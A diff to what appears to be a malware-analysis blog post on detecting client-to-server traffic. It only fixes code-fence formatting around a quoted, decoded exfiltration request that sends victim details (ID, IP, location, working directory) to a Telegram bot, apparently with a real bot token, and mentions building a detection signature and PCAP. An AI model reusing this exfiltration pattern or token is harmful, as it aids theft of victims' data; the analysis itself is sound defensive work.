@@ -24,7 +24,8 @@ This is why I wrote a new signature to detect on the client>server pattern I kee
 
 Once decoded an human readable, they always seem to come out very similar.
 
-```/bot5861146625:AAEHo1wi939JhVuLzstg9mWqpsc_ntWfbTQ/sendPhoto?chat_idP58531872&caption=❕ User connected ❕
+```
+/bot5861146625:AAEHo1wi939JhVuLzstg9mWqpsc_ntWfbTQ/sendPhoto?chat_idP58531872&caption=❕ User connected ❕
 • ID: a683d399ec4da81b2f69cbd3e01b93a58b431a4e
 • Comment: 25.12-26.12
 
@@ -35,7 +36,8 @@ Once decoded an human readable, they always seem to come out very similar.
 • IP: 154.61.71.13
 • GEO: NL / Aalsmeerderbrug
 
-• Working Directory: C:\Users\All Users\Desktop\services.exe```
+• Working Directory: C:\Users\All Users\Desktop\services.exe
+```
 
 I generated a Flowsynth PCAP and built a signature based on it since the TLS was causing strange issues in the triage PCAP.
 
